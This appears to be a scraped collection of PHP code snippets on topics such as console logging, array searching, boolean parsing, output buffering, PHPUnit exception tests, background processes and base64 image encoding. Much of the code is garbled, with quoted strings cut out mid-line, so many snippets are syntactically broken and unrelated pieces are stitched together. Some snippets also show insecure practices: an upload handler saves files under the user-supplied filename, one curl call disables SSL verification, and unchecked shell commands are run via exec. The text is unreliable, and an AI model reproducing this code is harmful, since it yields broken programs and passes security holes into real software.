function debug_log( $object=null, $label=null, $priority=1 ){ $priority = $priority<1? 1: $priority; $message = json_encode($object, JSON_PRETTY_PRINT); $label = "Debug" . ($label ? " ($label): " : echo "<script>console.log( }
$txt = $sample_array = array( debug_log( $txt, debug_log( $sample_array );
<?php $five = 5; $six = 6; ?> <script> console.log(<?php echo $five + $six ?>); </script> <?php $five = 5; $six = 6; echo("<script>console.log($five + $six);</script>"); ?>
function console_log( $data ) { $bt = debug_backtrace(); $caller = array_shift($bt); if ( is_array( $data ) ) error_log( end(split( else error_log( end(split( }
/* * Brief: Print to console.log() from PHP * Description: Print as many strings,arrays, objects, and other data types to console.log from PHP. * To use, just call consoleLog($data1, $data2, ... $dataN) and each dataI will be sent to console.log - note that * you can pass as many data as you want an this will still work. * * This is very powerful as it shows the entire contents of objects and arrays that can be read inside of the browser console log. * * A tag can be set by passing a string that has the prefix TAG- as one of the arguments. Everytime a string with the TAG- prefix is * detected, the tag is updated. This allows you to pass a tag that is applied to all data until it reaches another tag, which can then * be applied to all data after it. * * Example: * consoleLog( * Result: * FirstTag * FirstTag * SecTag */ function consoleLog(){ if(func_num_args() == 0){ return; } $tag = for ($i = 0; $i < func_num_args(); $i++) { $arg = func_get_arg($i); if(!empty($arg)){ if(is_string($arg)&& strtolower(substr($arg,0,4)) === $tag = substr($arg,4); }else{ $arg = json_encode($arg, JSON_HEX_TAG | JSON_HEX_AMP ); echo "<script>console.log( } } } }
$path = $file = fopen($path, $len = 1024; $output = fread( $file, $len ); while (!feof($file)) { $output .= fread( $file, $len ); } fclose($file); echo
if ( ! defined( if ( false === wp_is_ini_value_changeable( define( } elseif ( is_multisite() ) { define( } else { define( } } if ( ! defined( if ( false === wp_is_ini_value_changeable( define( } elseif ( -1 === $current_limit_int || $current_limit_int > 268435456 ) { define( } else { define( } }
function searchForId($id, $array) { foreach ($array as $key => $val) { if ($val[ return $key; } } return null; }
$keys = array_keys(array_combine(array_keys($userdb), array_column($userdb,
function searcharray($value, $key, $array) { foreach ($array as $k => $val) { if ($val[$key] == $value) { return $k; } } return null; }
/** * @param array multidimensional * @param string value to search for, ie a specific field name like name_first * @param string associative key to find it in, ie field_name * * @return array keys. */ function search_revisions($dataArray, $search_value, $key_to_search) { $keys = array(); foreach ($dataArray as $key => $cur_value) { if ($cur_value[$key_to_search] == $search_value) { $keys[] = $key; } } return $keys; }
/** * @param array multidimensional * @param string $search_value The value to search for, ie a specific * @param string $key_to_search The associative key to find it in, ie first_name * @param string $other_matching_key The associative key to find in the matches for employed * @param string $other_matching_value The value to find in that matching associative key, ie true * * @return array keys, ie all the people with the first name */ function search_revisions($dataArray, $search_value, $key_to_search, $other_matching_value = null, $other_matching_key = null) { $keys = array(); foreach ($dataArray as $key => $cur_value) { if ($cur_value[$key_to_search] == $search_value) { if (isset($other_matching_key) && isset($other_matching_value)) { if ($cur_value[$other_matching_key] == $other_matching_value) { $keys[] = $key; } } else { $keys[] = $key; } } } return $keys; }
$data = array( array( ), array( ), array( ) ); $findKey = search_revisions($data, print_r($findKey);
$arr = array( ) ), ) ) ) ); $result = searchItemsByKey($arr, print print_r($result); print Array ( [0] => value1 [1] => value2 )
function searchItemsByKey($array, $key) { $results = array(); if (is_array($array)) { if (isset($array[$key]) && key($array)==$key) $results[] = $array[$key]; foreach ($array as $sub_array) $results = array_merge($results, searchItemsByKey($sub_array, $key)); } return $results; }
$userdb=Array ( (0) => Array ( (uid) => (name) => (url) => ), (1) => Array ( (uid) => (name) => (pic_square) => ), (2) => Array ( (uid) => (name) => (pic_square) => ) );
<?php $search = 5465; $found = array_filter($userdb,function($v,$k) use ($search){ return $v[ }) $values= print_r(array_value($found)); $keys = print_r(array_keys($found));
function searchArrayKeyVal($sKey, $id, $array) { foreach ($array as $key => $val) { if ($val[$sKey] == $id) { return $key; } } return false; }
$userdb = array ( array ( array ( array ( ); $arrayKey = searchArrayKeyVal("uid", if ($arrayKey!==false) { echo "Search Result: ", $userdb[$arrayKey][ } else { echo "Search Result can not be found"; }
$pic_square = $userdb[array_search($uid,array_column($userdb,
function search_in_array_r($needle, $array) { $found = array(); foreach ($array as $key => $val) { if ($val[1] == $needle) { array_push($found, $val[1]); } } if (count($found) != 0) return $found; else return null; }
/** * searches a simple as well as multi dimension array * @param type $needle * @param type $haystack * @return boolean */ public static function in_array_multi($needle, $haystack){ $needle = trim($needle); if(!is_array($haystack)) return False; foreach($haystack as $key=>$value){ if(is_array($value)){ if(self::in_array_multi($needle, $value)) return True; else self::in_array_multi($needle, $value); } else if(trim($value) === trim($needle)){ error_log("$value === $needle setting visibility to 1 hidden"); return True; } } return False; }
<?php include( $query = "a= $Array = array( array( array( ); $Result = ArraySearch($Array,$query,1); echo print_r($Result); echo //
$a = [ $found = null; $search = array_walk($a, function ($k, $v) use ($search, &$found) { if (in_array($search, $k)) { $found = $v; } }); var_dump($found);
$res = array_search( if($res == echo } else { echo }
if( ! function_exists( function arraySearchMulti($search,$key,$array,$returnKey=false) { foreach ($array as $k => $val) { if (isset($val[$key])) { if ((string)$val[$key] == (string)$search) { return ($returnKey ? $k : $val); } }else{ return (is_array($val) ? arraySearchMulti($search,$key,$val,$returnKey) : null); } } return null; }}
function search_in_array($srchvalue, $array) { if (is_array($array) && count($array) > 0) { $foundkey = array_search($srchvalue, $array); if ($foundkey === FALSE) { foreach ($array as $key => $value) { if (is_array($value) && count($value) > 0) { $foundkey = search_in_array($srchvalue, $value); if ($foundkey != FALSE) return $foundkey; } } } else return $foundkey; } }
for( $i =0; $i < sizeof($allUsers); $i++) { $NEEDLE1= $NEEDLE2= $sterm= if(isset($allUsers[$i][$NEEDLE1]) && isset($allUsers[$i][$NEEDLE2]) { $Fname= $allUsers[$i][$NEEDLE1]; $Lname= $allUsers[$i][$NEEDLE2]; $pos1 = stripos($Fname, $sterm); $pos2=stripos($Lname, $sterm); if($pos1 !== false ||$pos2 !== false) {$resultsMatched[] =$allUsers[$i];} else { continue;} } } Print_r($resultsMatched);
function searchArrayKeyVal($sKey, $id, $array) { foreach ($array as $key => $val) { if (strpos(strtolower($val[$sKey]), strtolower(trim($id))) !== false) { return $key; } } return false; }
<?php function recursive_array_search($needle,$haystack) { foreach($haystack as $key=>$value) { $current_key=$key; if($needle===$value OR (is_array($value) && recursive_array_search($needle,$value) !== false)) { return $current_key; } } return false; } ?>
$search1 = $search2 = $arr = array( foreach ($arr as $value) { if (is_array($value)) { if (in_array($search2, $value)) { echo "successsfully"; } } else { if ($value == $search1) { echo "success"; } } }
$a = [ [ "_id" => "5a96933414d48831a41901f2", "discount_amount" => 3.29, "discount_id" => "5a92656a14d488570c2c44a2", ], [ "_id" => "5a9790fd14d48879cf16a9e8", "discount_amount" => 4.53, "discount_id" => "5a9265b914d488548513b122", ], [ "_id" => "5a98083614d488191304b6c3", "discount_amount" => 15.24, "discount_id" => "5a92806a14d48858ff5c2ec3", ], [ "_id" => "5a982a4914d48824721eafe3", "discount_amount" => 45.74, "discount_id" => "5a928ce414d488609e73b443", ], [ "_id" => "5a982a4914d48824721eafe55", "discount_amount" => 10.26, "discount_id" => "5a928ce414d488609e73b443", ], ];
function searchForId($id, $array) { $did=0; $dia=0; foreach ($array as $key => $val) { if ($val[ $dia +=$val[ $did++; } } if($dia != echo $dia; var_dump($did); } return null; }; print_r(searchForId(
Function time to run 1 million iterations -------------------------------------------- (int) "123": 0.55029 intval("123"): 1.0115 (183%) (int) "0": 0.42461 intval("0"): 0.95683 (225%) (int) int: 0.1502 intval(int): 0.65716 (438%) (int) array("a", "b"): 0.91264 intval(array("a", "b")): 1.47681 (162%) (int) "hello": 0.42208 intval("hello"): 0.93678 (222%)
| INPUT ($x) | (int) $x |intval($x) | 0 + $x | |-----------------|------------|-----------|-----------| | "123" | 0.51541 | 0.96924 | 0.33828 | | "0" | 0.42723 | 0.97418 | 0.31353 | | 123 | 0.15011 | 0.61690 | 0.15452 | | array("a", "b") | 0.8893 | 1.45109 | err! | | "hello" | 0.42618 | 0.88803 | 0.1691 | |-----------------|------------|-----------|-----------|
$x = "11"; (int) $x; intval($x); $x + 0; $x = "0x11"; (int) $x; intval($x); $x + 0; $x = "011"; (int) $x; intval($x); $x + 0;
string coerce: 7.42296099663 string cast: 8.05654597282 string fail coerce: 7.14159703255 string fail cast: 7.87444186211
function test_string_coerce($s) { return 0 + $s; } function test_string_cast($s) { return (integer)$s; } $iter = 10000000; print "-- running each text $iter times.\n"; $string_coerce = new Timer; $string_coerce->Start(); print "String Coerce test\n"; for( $i = 0; $i < $iter ; $i++ ) { test_string_coerce( } $string_coerce->Stop(); $string_cast = new Timer; $string_cast->Start(); print "String Cast test\n"; for( $i = 0; $i < $iter ; $i++ ) { test_string_cast( } $string_cast->Stop(); $string_coerce_fail = new Timer; $string_coerce_fail->Start(); print "String Coerce fail test\n"; for( $i = 0; $i < $iter ; $i++ ) { test_string_coerce( } $string_coerce_fail->Stop(); $string_cast_fail = new Timer; $string_cast_fail->Start(); print "String Cast fail test\n"; for( $i = 0; $i < $iter ; $i++ ) { test_string_cast( } $string_cast_fail->Stop(); print "\n"; print "string coerce: ".$string_coerce->Elapsed()."\n"; print "string cast: ".$string_cast->Elapsed()."\n"; print "string fail coerce: ".$string_coerce_fail->Elapsed()."\n"; print "string fail cast: ".$string_cast_fail->Elapsed()."\n"; class Timer { var $ticking = null; var $started_at = false; var $elapsed = 0; function Timer() { $this->ticking = null; } function Start() { $this->ticking = true; $this->started_at = microtime(TRUE); } function Stop() { if( $this->ticking ) $this->elapsed = microtime(TRUE) - $this->started_at; $this->ticking = false; } function Elapsed() { switch( $this->ticking ) { case true: return "Still Running"; case false: return $this->elapsed; case null: return "Not Started"; } } }
$ time php -r real 2m10.397s user 2m10.220s sys 0m0.025s $ time php -r real 2m1.724s user 2m1.635s sys 0m0.009s $ time php -r real 1m21.000s user 1m20.964s sys 0m0.007s
$string = $test_mode_mail = settype($string, var_dump($test_mode_mail); if($test_mode_mail) echo
filter_var( filter_var( 1, FILTER_VALIDATE_BOOLEAN); filter_var( filter_var( filter_var( filter_var( filter_var( 0, FILTER_VALIDATE_BOOLEAN); filter_var( filter_var( filter_var( filter_var( filter_var( filter_var( null, FILTER_VALIDATE_BOOLEAN);
$string = $boolean = json_decode($string); if($boolean) { } else { }
$str = $boolean = strtolower($str) == var_dump($boolean);
function stringToBool($string){ return ( mb_strtoupper( trim( $string)) === mb_strtoupper ("true")) ? TRUE : FALSE; }
function stringToBool($string) { return filter_var($string, FILTER_VALIDATE_BOOLEAN); }
<?php echo echo echo echo echo echo echo echo echo echo echo ?>
$test_var = $test_var = strtolower(trim($test_var)) == $result = (boolean) $test_var;
function safeBool($test_var){ $test_var = strtolower(trim($test_var)) == return (boolean) $test_var; }
function stringToBool($str){ if($str === $str = true; }else{ $str = false; } return $str; } stringToBool($atts[
$wannabebool = "false"; $isTrue = ["true",1,"yes","ok","wahr"]; $bool = in_array(strtolower($wannabebool),$isTrue);
$string = " put returns between paragraphs for linebreak add 2 spaces at end ";
$string = "put returns between paragraphs for linebreak add 2 spaces at end ";
$string = preg_replace("/[\\n\\r]+/", "", $string);
$string = preg_replace("/[\\n\\r]+/", " ", $string);
$searches = array("\r", "\n", "\r\n"); str_replace($searches, "", $string); $output = preg_replace(
$str = " put returns between paragraphs for linebreak add 2 spaces at end "; echo preg_replace( "/\r|\n/", "", $str );
$string = str_replace("\r", "", $string); $string = str_replace("\n", "", $string);
foreach($equipxml as $equip) { $current_device = $equip->xpath("name"); if ( $current_device[0] == $device ) { $nodeid = $equip->id; <break out of if and foreach here> } }
foreach($equipxml as $equip) { $current_device = $equip->xpath("name"); if ( $current_device[0] == $device ) { $nodeid = $equip->id; break; } this_command_is_not_executed_after_a_match_is_found(); }
foreach (array( echo "$a "; foreach (array( echo "$b "; if ($a == $b) { break 2; } } echo ". "; } echo "!";
do if ($foo) { if ($abort === true) break; } while (false);
foreach($equipxml as $equip) { $current_device = $equip->xpath("name"); if ( $current_device[0] == $device ) { $nodeid = $equip->id; break; } }
$ImageCounter = 0; while ( condition ) $ImageCounter++; if ($ImageCounter == 1) { echo } endwhile;
<?php for ($i=0; $i < 100; $i++) { if (i%2 == 0) { include(do_this_for_even.php); } else { include(do_this_for_odd.php); } } ?>
<?php $tests = 100000; for ($i = 0; $i < $tests; $i++) { $string = md5(rand()); $position = rand(0, 31); $start1 = microtime(true); $char1 = $string[$position]; $end1 = microtime(true); $time1[$i] = $end1 - $start1; $start2 = microtime(true); $char2 = substr($string, $position, 1); $end2 = microtime(true); $time2[$i] = $end2 - $start2; $start3 = microtime(true); $char3 = $string{$position}; $end3 = microtime(true); $time3[$i] = $end3 - $start3; } $avg1 = array_sum($time1) / $tests; echo $avg2 = array_sum($time2) / $tests; echo $avg3 = array_sum($time3) / $tests; echo ?>
$ php 1.php the average float microtime using "array[]" is 1.914701461792E-6 the average float microtime using "substr()" is 2.2536706924438E-6 the average float microtime using "array{}" is 1.821768283844E-6 $ php 1.php the average float microtime using "array[]" is 1.7251944541931E-6 the average float microtime using "substr()" is 2.0931363105774E-6 the average float microtime using "array{}" is 1.7225742340088E-6 $ php 1.php the average float microtime using "array[]" is 1.7293763160706E-6 the average float microtime using "substr()" is 2.1037721633911E-6 the average float microtime using "array{}" is 1.7249774932861E-6
<?php var_dump($_POST); echo echo echo echo ?> <hr /> <form method="POST"> <input type="text" name="name" value="bob" /><br /> <input type="text" name="flag1" value="true" /><br /> <select name="flag2[]" multiple> <option value="true" selected>true</option> <option value="false" selected>false</option> <option value="0" selected>0</option> </select><br /> <input type="submit" value="Submit" /><br /> </form>
<?php $string = $stringExp = explode( $shortCode = for($i = 0; $i < count($stringExp); $i++): $shortCode .= substr($stringExp[$i], 0, 1); endfor; echo $shortCode; ?>
$ch = curl_init("REMOTE XML FILE URL GOES HERE"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, 0); $data = curl_exec($ch); curl_close($ch);
(PROXY WITHOUT AUTENTICATION EXAMPLE) <?php $aContext = array( ), ); $cxContext = stream_context_create($aContext); $sFile = file_get_contents("http: echo $sFile; ?>
$client = new Client( $request = $client->newRequest( $response = $request->getResponse(); echo $response->getParsedResponse();
ob_start(); echo("Hello there!"); $output = ob_get_contents(); ob_end_clean();
<?php ob_start(); ?> <div> <span>text</span> <a href=" </div> <?php $content = ob_get_clean(); ?>
<?php $content = <span>text</span> <a href=" </div> ?>
ob_start(); echo("Hello there!"); $output = ob_get_clean();
<?php $lvs_html = "" ; $lvs_html .= "<div>html</div>" ; $lvs_html .= gf_component_assembler__without_ob( ) ; $lvs_html .= "<div>more html</div>" ; $lvs_html .= "----<br/>" ; $lvs_html .= "<div>html</div>" ; $lvs_html .= gf_component_assembler__with_ob( ) ; $lvs_html .= "<div>more html</div>" ; echo $lvs_html ; function gf_component_assembler__without_ob( ) { $lvs_html = "<div>01 - component header</div>" ; include( "component_contents.php" ) ; $lvs_html .= "<div>03 - component footer</div>" ; return $lvs_html ; } ; function gf_component_assembler__with_ob( ) { $lvs_html = "<div>01 - component header</div>" ; ob_start(); include( "component_contents.php" ) ; $lvs_html .= ob_get_clean(); $lvs_html .= "<div>03 - component footer</div>" ; return $lvs_html ; } ; ?>
<!-- component_contents.php --> <div> 02 - component contents </div>
$someTemplate->selectSection( echo $someTemplate->selectSection( echo
ob_start(); $foo->bar(); ob_clean(); $foo->render(); ob_flush(); $none = ob_get_contents(); ob_end_clean();
<?php require_once class ExceptionTest extends PHPUnit_Framework_TestCase { public function testException() { $this->expectException(InvalidArgumentException::class); exampleMethod($anInvalidArgument); } }
class ExceptionTest extends PHPUnit_Framework_TestCase { /** * @expectedException InvalidArgumentException */ public function testException() { ... } }
namespace \My\Cool\Package; class AuthTest extends \PHPUnit_Framework_TestCase { public function testLoginFailsForWrongPassword() { $this->expectException(WrongPasswordException::class); Auth::login( } }
try{ $test->methodWhichWillThrowException(); $this->fail("Expected exception 1162011 not thrown"); }catch(MySpecificException $e){ $this->assertEquals(1162011, $e->getCode()); $this->assertEquals("Exception Message", $e->getMessage()); }
public function testSomething() { $test = function() { }; $this->assertException( $test, }
$this->expectException(\InvalidArgumentException::class); $this->expectExceptionMessage(
public function testException() { try { $this->methodThatThrowsException(); $this->fail("Expected Exception has not been raised."); } catch (Exception $ex) { $this->assertEquals($ex->getMessage(), "Exception message"); } }
<?php $this->assertThrows(MyException::class, [$obj, $this->assertThrows(MyException::class, function() use ($obj) { $obj->doSomethingBad(); });
<?php declare(strict_types=1); use Jchook\AssertThrows\AssertThrows; use PHPUnit\Framework\TestCase; use MyNamespace\MyException; use MyNamespace\MyObject; final class MyTest extends TestCase { use AssertThrows; public function testMyObject() { $obj = new MyObject(); $this->assertThrows(MyException::class, function() use ($obj) { $obj->doSomethingBad(); }); $this->assertThrows(MyException::class, function() use ($obj) { $obj->doSomethingBad(); }, function($exception) { $this->assertEquals( $this->assertEquals(123, $exception->getCode()); } ); $this->assertNotThrows(MyException::class, function() use ($obj) { $obj->doSomethingGood(); }); } } ?>
/** * Asserts that the given callback throws the given exception. * * @param string $expectClass The name of the expected exception class * @param callable $callback A callback which should throw the exception */ protected function assertException(string $expectClass, callable $callback) { try { $callback(); } catch (\Throwable $exception) { $this->assertInstanceOf($expectClass, $exception, return; } $this->fail( }
public function testSomething() { $this->assertException(\PDOException::class, function() { new \PDO( }); $this->assertException(\PDOException::class, function() { new \PDO( }); }
class ExceptionTest extends PHPUnit_Framework_TestCase { public function testException() { $this->expectException(InvalidArgumentException::class); $this->expectExceptionMessage( $this->expectExceptionMessageRegExp( $this->expectExceptionCode(123); throw new InvalidArgumentException( } public function testAnotherException() { $this->expectException(Exception::class); throw new Exception( } }
/** * @expectedException Exception * @expectedExceptionMessage Amount has to be bigger then 0! */ public function testDepositNegative() { $this->account->deposit(-7); }
public function testSomeFunction() { $e=null; $targetClassObj= new TargetClass(); try { $targetClassObj->doSomething(); } catch ( \Exception $e ) { } $this->assertInstanceOf(\Exception::class,$e); $this->assertEquals( $e=null; try { $targetClassObj->doSomethingElse(); } catch ( Exception $e ) { } $this->assertInstanceOf(\Exception::class,$e); $this->assertEquals( }
exec(sprintf("%s > %s 2>&1 & echo $! >> %s", $cmd, $outputfile, $pidfile));
function isRunning($pid){ try{ $result = shell_exec(sprintf("ps %d", $pid)); if( count(preg_split("/\n/", $result)) > 2){ return true; } }catch(Exception $e){} return false; }
Proc_Close (Proc_Open ("./command --foo=1 &", Array (), $foo));
<?php ini_set("display_errors",1); error_reporting(E_ALL); echo "<pre>loading page</pre>"; function run_background_process() { file_put_contents("testprocesses.php","foreground start time = " . time() . "\n"); echo "<pre> foreground start time = " . time() . "</pre>"; exec("php background.php > testoutput.php 2>&1 & echo $!", $output); echo "<pre> foreground end time = " . time() . "</pre>"; file_put_contents("testprocesses.php","foreground end time = " . time() . "\n", FILE_APPEND); return $output; } echo "<pre>calling run_background_process</pre>"; $output = run_background_process(); echo "<pre>output = "; print_r($output); echo "</pre>"; echo "<pre>end of page</pre>"; ?>
<? file_put_contents("testprocesses.php","background start time = " . time() . "\n", FILE_APPEND); sleep(10); file_put_contents("testprocesses.php","background end time = " . time() . "\n", FILE_APPEND); ?>
loading page calling run_background_process foreground start time = 1266003600 foreground end time = 1266003600 output = Array ( [0] => 15010 ) end of page
foreground start time = 1266003600 foreground end time = 1266003600 background start time = 1266003600 background end time = 1266003610
$proc_command = "wget.exe http: $proc = popen($proc_command, "r"); pclose($proc);
-q keeps wget quiet. -O - outputs to stdout. -b works on background
function LaunchBackgroundProcess($command){ if(PHP_OS== $command = } else { $command = $command . } $handle = popen($command, if($handle!==false){ pclose($handle); return true; } else { return false; } }
function run_process($cmd,$outputFile = $pid=0; if (strtoupper(substr(PHP_OS, 0, 3)) === $cmd = $handle = popen("start /B ". $cmd, "r"); $read = fread($handle, 200); $pid=substr($read,strpos($read, $pid=substr($pid,0,strpos($pid, $pid = (int)$pid; pclose($handle); }else{ $pid = (int)shell_exec(sprintf( } return $pid; } function is_process_running($pid){ if (strtoupper(substr(PHP_OS, 0, 3)) === $result = shell_exec( if (count(preg_split("/\n/", $result)) > 0 && !preg_match( return true; } }else{ $result = shell_exec(sprintf( if (count(preg_split("/\n/", $result)) > 2 && !preg_match( return true; } } return false; } function stop_process($pid){ if (strtoupper(substr(PHP_OS, 0, 3)) === $result = shell_exec( if (count(preg_split("/\n/", $result)) > 0 && !preg_match( return true; } }else{ $result = shell_exec(sprintf( if (!preg_match( return true; } } }
<?php function startBackgroundProcess( $command, $stdin = null, $redirectStdout = null, $redirectStderr = null, $cwd = null, $env = null, $other_options = null ) { $descriptorspec = array( 1 => is_string($redirectStdout) ? array( 2 => is_string($redirectStderr) ? array( ); if (is_string($stdin)) { $descriptorspec[0] = array( } $proc = proc_open($command, $descriptorspec, $pipes, $cwd, $env, $other_options); if (!is_resource($proc)) { throw new \Exception("Failed to start background process by command: $command"); } if (is_string($stdin)) { fwrite($pipes[0], $stdin); fclose($pipes[0]); } if (!is_string($redirectStdout)) { fclose($pipes[1]); } if (!is_string($redirectStderr)) { fclose($pipes[2]); } return $proc; }
$proc = startBackgroundProcess( print_r(proc_get_status($proc));
$message = $backgroundJob = function() use ($message) { echo $message; }
<?php $WshShell = new COM("WScript.Shell"); $oExec = $WshShell->Run("notepad.exe", 7, false); ?>
<?php $WshShell = new COM("WScript.Shell"); $oExec = $WshShell->Run("cmd /C dir /S %windir%", 0, false); ?>
<?php $WshShell = new COM("WScript.Shell"); $oExec = $WshShell->Run("mspaint.exe", 3, true); ?>
<?php class DbUserRepository implements UserRepositoryInterface { protected $db; public function __construct($db) { $this->db = $db; } public function findAll() { } public function findById($id) { } public function findByName($name) { } public function create($user) { } public function remove($user) { } public function update($user) { } }
<?php class MyController { public function users() { $users = User::select( ->byCountry( return View::make( } }
<?php class MyController { public function users() { $users = $this->repo->get_first_name_last_name_email_username_status_by_country_order_by_name( return View::make( } }
class User { public $id; public $first_name; public $last_name; public $gender; public $email; public $password; }
interface UserRepositoryInterface { public function find($id); public function save(User $user); public function remove(User $user); }
class SQLUserRepository implements UserRepositoryInterface { protected $db; public function __construct(Database $db) { $this->db = $db; } public function find($id) { return $this->db->find($id, } public function save(User $user) { $this->db->save($user, } public function remove(User $user) { $this->db->remove($user, } }
interface AllUsersQueryInterface { public function fetch($fields); }
class AllUsersQuery implements AllUsersQueryInterface { protected $db; public function __construct(Database $db) { $this->db = $db; } public function fetch($fields) { return $this->db->select($fields)->from( } }
class AllOverdueAccountsQuery implements AllOverdueAccountsQueryInterface { protected $db; public function __construct(Database $db) { $this->db = $db; } public function fetch() { return $this->db->query($this->sql())->rows(); } public function sql() { return "SELECT..."; } }
class UsersController { public function index(AllUsersQueryInterface $query) { $users = $query->fetch([ return Response::view( } public function add() { return Response::view( } public function insert(UserRepositoryInterface $repository) { $user = new User; $user->first_name = $_POST[ $user->last_name = $_POST[ $user->gender = $_POST[ $user->email = $_POST[ $repository->save($user); return Response::json([ } public function view(SpecificUserQueryInterface $query, $id) { if (!$user = $query->fetch($id, [ return Response::notFound(); } return Response::view( } public function edit(SpecificUserQueryInterface $query, $id) { if (!$user = $query->fetch($id, [ return Response::notFound(); } return Response::view( } public function update(UserRepositoryInterface $repository) { if (!$user = $repository->find($id)) { return Response::notFound(); } $user->first_name = $_POST[ $user->last_name = $_POST[ $user->gender = $_POST[ $user->email = $_POST[ $repository->save($user); return true; } public function delete(UserRepositoryInterface $repository) { if (!$user = $repository->find($id)) { return Response::notFound(); } $repository->delete($user); return true; } }
<?php interface Repository { public function addEntity(Entity $entity); public function updateEntity(Entity $entity); public function removeEntity(Entity $entity); /** * @return Entity */ public function loadEntity($entityId); public function factoryEntitySelector():Selector } interface Selector extends \Countable { public function count(); /** * @return Entity[] */ public function fetchEntities(); /** * @return Entity */ public function fetchEntity(); public function limit(...$limit); public function filter(Filter $filter); public function orderBy($column, $ascending = true); public function removeFilter($filterName); } interface Filter { public function getFilterName(); }
class SqlEntityRepository { ... public function factoryEntitySelector() { return new SqlSelector($this); } ... } class SqlSelector implements Selector { ... private function adaptFilter(Filter $filter):SqlQueryFilter { return (new SqlSelectorFilterAdapter())->adaptFilter($filter); } ... } class SqlSelectorFilterAdapter { public function adaptFilter(Filter $filter):SqlQueryFilter { $concreteClass = (new StringRebaser( ->rebase(get_class($filter)); return new $concreteClass($filter); } }
/** @var Repository $repository*/ $selector = $repository->factoryEntitySelector(); $selector->filter(new AttributeEquals( $activatedUserCount = $selector->count(); $activatedUsers = $selector->fetchEntities();
class DbUserRepository implements UserRepositoryInterface { public function findAll() { return User::all(); } public function get(Array $columns) { return User::select($columns); }
class UserEntity extends PersistentEntity { public function getOrders() { $this->getField( } } class UserModel { protected $orm; public function findUsers(IGetOptions $options = null) { return $orm->getAllEntities( ); } } class OrderEntity extends PersistentEntity {} class OrderModel { public function findOrdersById(array $ids, IGetOptions $options = null) { } }
$objOptions->getConditionHolder()->addConditionBind( new ConditionBind( new Condition( ) );
public function findColumnsById($id, array $columns = array()){ if (empty($columns)) { } } public function findById($id) { $data = $this->findColumnsById($id); }
public function __call($function, $arguments) { if (strpos($function, $parameter = substr($function, 6, strlen($function)); } }
POST /api/graphql { query: { Model(attr1: attr2 attr3 } } }
$path = $type = pathinfo($path, PATHINFO_EXTENSION); $data = file_get_contents($path); $base64 =
$imagedata = file_get_contents("/path/to/image.jpg"); $base64 = base64_encode($imagedata);
$img_file = $imgData = base64_encode(file_get_contents($img_file)); $src = echo
$img = imagecreatefrompng( ob_start(); imagepng($img); $bin = ob_get_clean(); $b64 = base64_encode($bin);
<img src="data:image/png;base64,<?php echo base64_encode(file_get_contents("IMAGE URL HERE")) ?>">
function getDataURI($imagePath) { $finfo = new finfo(FILEINFO_MIME_TYPE); $type = $finfo->file($imagePath); return } echo echo
$url = "http: $ch = curl_init($url); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); ?> <img src="data:image/png;base64,<?php echo base64_encode($output);?>">
if (!isset($_GET["getfile"])) { if ($_FILES["file"]["error"] > 0) { echo "Error: " . $_FILES["file"]["error"] . "<br>"; } else { move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); $bin_string = file_get_contents($_FILES["file"]["name"]); $hex_string = base64_encode($bin_string); $mysqli = mysqli_init(); if (!$mysqli->real_connect( die( } $mysqli->query("INSERT INTO upload(image) VALUES ( } }
public static function getImageDataFromUrl($url) { $urlParts = pathinfo($url); $extension = $urlParts[ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_HEADER, 0); $response = curl_exec($ch); curl_close($ch); $base64 = return $base64; }
<?php if (isset($the_var)) { echo "set"; } else { echo "not set"; } echo "\n"; if (empty($the_var)) { echo "empty"; } else { echo "not empty"; } ?>
$a = 0; if (isset($a)) { echo } if (!empty($a)) { echo } else { echo }
* "" (an empty string) * 0 (0 as an integer) * "0" (0 as a string) * NULL * FALSE * array() (an empty array) * var $var; (a variable declared, but without a value in a class)
$time = strtotime( $newformat = date( echo $newformat;
$dateDE = "16/10/2013"; $dateUS = \DateTime::createFromFormat("d.m.Y", $dateDE)->format("m/d/Y");
PHP Fatal error: Call to a member function format() on a non-object
$dateDE = "16/10/2013"; $dateObj = \DateTime::createFromFormat("d.m.Y", $dateDE); if (!$dateObj) { throw new \UnexpectedValueException("Could not parse the date: $date"); } $dateUS = $dateObj->format("m/d/Y");
$d = new DateTime( $timestamp = $d->getTimestamp(); $formatted_date = $d->format(
$_firstDate = date("m-d-Y", strtotime($_yourDateString));
$_newDate = date("Y-m-d",strtotime($_yourDateString));
$date = "23/02/2013"; $timestamp = strtotime($date); if ($timestamp === FALSE) { $timestamp = strtotime(str_replace( } echo $timestamp;
if (!empty($date)) { $timestamp = strtotime($date); if ($timestamp === FALSE) { $timestamp = strtotime(str_replace( } $date = date( }
zend_extension=/full/path/to/opcache.so (nix) zend_extension=C:\path\to\php_opcache.dll (win)
zend_extension="C:\Program Files\PHP5.5\ext\php_opcache.dll"
zend_extension=C:\xampp\php\ext\php_opcache.dll [opcache] opcache.enable = 1 opcache.memory_consumption = 128 opcache.max_accelerated_files = 4000 opcache.revalidate_freq = 60 ; Required for Moodle opcache.use_cwd = 1 opcache.validate_timestamps = 1 opcache.save_comments = 1 opcache.enable_file_override = 0 ; If something does not work in Moodle ;opcache.revalidate_path = 1 ; May fix problems with include paths ;opcache.mmap_base = 0x20000000 ; (Windows only) fix OPcache crashes with event id 487 ; Experimental for Moodle 2.6 and later ;opcache.fast_shutdown = 1 ;opcache.enable_cli = 1 ; Speeds up CLI cron ;opcache.load_comments = 0 ; May lower memory use, might not be compatible with add-ons and other apps extension=C:\xampp\php\ext\php_intl.dll [intl] intl.default_locale = en_utf8 intl.error_level = E_WARNING
$value = "1024"; $even = array(0, 2, 4, 6, 8); if(in_array(substr($value, -1),$even)){ }else{ }
$value = "1024"; $even = array(0 => 1, 2 => 1, 4 => 1, 6 => 1, 8 => 1); if(isset($even[substr($value, -1)]){ }else{ }
$even = array(0, 2, 4, 6, 8); if(in_array(substr($number, -1),$even)){ }else{ }
